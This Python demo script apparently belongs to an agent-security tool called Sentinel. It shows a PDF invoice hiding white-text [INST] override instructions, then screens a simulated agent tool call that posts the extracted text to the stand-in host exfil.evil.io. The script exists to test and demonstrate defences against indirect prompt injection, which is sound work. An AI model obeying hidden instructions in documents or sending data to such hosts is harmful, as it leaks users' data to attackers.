"""
Sentinel PDF Injection Demo — End-to-end runnable agent.

Demonstrates:
  1. Agent reads a PDF invoice (looks legitimate)
  2. PDF contains hidden white-text [INST] injection
  3. pypdf extracts the full text including hidden content
  4. Agent tries to call_http based on injected instructions
  5. Sentinel catches the injection at Stage 1 (regex) + Stage 2 (ML)
  6. Tool call is blocked BEFORE execution

Run:
    cd backend
    $env:SENTINEL_TOKEN = "your-agent-session-token"
    python demos/pdf_injection/demo_agent.py

Or with a direct token argument:
    python demos/pdf_injection/demo_agent.py --token eyJhbGci...
"""
import argparse
import os
import sys

# Make sentinel_sdk importable from any working directory
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

try:
    import pypdf
except ImportError:
    print("Install pypdf: pip install pypdf")
    sys.exit(1)

from sentinel_sdk import SentinelBlocked, SentinelConnectionError, SentinelGuard

PDF_PATH = os.path.join(os.path.dirname(__file__), "invoice_poisoned.pdf")
SENTINEL_ENDPOINT = os.environ.get("SENTINEL_ENDPOINT", "http://localhost:8000")

DIVIDER = "-" * 70


def extract_pdf_text(path: str) -> str:
    reader = pypdf.PdfReader(path)
    return "\n".join(page.extract_text() or "" for page in reader.pages)


def run_demo(token: str) -> None:
    print()
    print("=" * 70)
    print("  SENTINEL LAYER -- PDF INDIRECT INJECTION DEMO")
    print("=" * 70)

    # Step 1: Check PDF exists
    if not os.path.exists(PDF_PATH):
        print(f"\n[!] PDF not found: {PDF_PATH}")
        print("    Run generate_poisoned_pdf.py first.")
        sys.exit(1)

    print(f"\n[1] Loading PDF: invoice_poisoned.pdf")
    print(f"    Visible content: A legitimate Q3 invoice for $12,450.00")
    print(f"    Hidden content: [INST] override instructions in white text")

    # Step 2: Extract text (simulates what an AI agent's document reader does)
    print(f"\n[2] Extracting text (simulating agent document reader)...")
    full_text = extract_pdf_text(PDF_PATH)
    print(f"    Extracted {len(full_text)} characters")
    print(f"\n    Preview (first 300 chars):")
    print(f"    {full_text[:300].replace(chr(10), ' ')}")

    # Step 3: Show the injection is visible in extracted text
    if "[INST]" in full_text:
        inject_start = full_text.index("[INST]")
        print(f"\n    [!] Hidden injection found in extracted text at char {inject_start}:")
        print(f"    {full_text[inject_start:inject_start+150]}...")
    else:
        print("\n    [Note: Injection not visible in text extract -- PDF may need regeneration]")

    # Step 4: Initialize Sentinel
    print(f"\n[3] Initializing SentinelGuard...")
    print(f"    Endpoint : {SENTINEL_ENDPOINT}")
    print(f"    Token    : {token[:30]}...{token[-6:]}")

    try:
        guard = SentinelGuard(
            endpoint=SENTINEL_ENDPOINT,
            token=token,
            agent_id="pdf_demo_agent",
            session_id="pdf_demo_session_001",
        )
    except ValueError as e:
        print(f"\n[ERROR] {e}")
        sys.exit(1)

    # Step 5: Agent tries to act on the extracted text
    print(f"\n[4] Agent attempts to call_http based on document instructions...")
    print(f"    Tool    : call_http")
    print(f"    URL     : https://exfil.evil.io/collect")
    print(f"    Content : Extracted PDF text (contains hidden injection)")
    print(f"\n{DIVIDER}")

    try:
        guard.screen(
            tool_name="call_http",
            arguments={"url": "https://exfil.evil.io/collect", "method": "POST"},
            incoming_text=full_text,
            incoming_source="retrieved_document",
        )
        # Should not reach here
        print("\n[FAIL] Sentinel did NOT block the injection. Check configuration.")

    except SentinelBlocked as e:
        print(f"\n[PASS] SENTINEL BLOCKED THE ATTACK")
        print(f"    Verdict    : {e.verdict.upper()}")
        print(f"    Risk Score : {e.risk_score:.2f}")
        print(f"    Explanation: {e.explanation[:200]}")
        if e.matched_signals:
            print(f"    Signals ({len(e.matched_signals)}):")
            for sig in e.matched_signals[:3]:
                print(f"      * {sig.get('signal', sig)}")
        print(f"\n    The call_http to evil.io was NEVER executed.")
        print(f"    The exfiltration attempt was caught before any data left the system.")

    except SentinelConnectionError as e:
        print(f"\n[ERROR] Cannot reach Sentinel: {e}")
        print(f"    Is the backend running? cd backend && uvicorn app.main:app --reload")
        sys.exit(1)

    print(f"\n{DIVIDER}")
    print(f"\n[5] Demo complete. View full audit log:")
    print(f"    -> http://localhost:5173  (Dashboard Audit Log)")
    print(f"    -> GET {SENTINEL_ENDPOINT}/events/history?verdict=block&limit=5")
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sentinel PDF Injection Demo")
    parser.add_argument("--token", default=os.environ.get("SENTINEL_TOKEN", ""),
                        help="Agent session token (or set SENTINEL_TOKEN env var)")
    args = parser.parse_args()

    if not args.token:
        print("[ERROR] No token provided.")
        print("  Set SENTINEL_TOKEN env var or pass --token <your-agent-session-token>")
        print("  Generate a token: POST /tokens/agent (requires dashboard login)")
        sys.exit(1)

    run_demo(args.token)
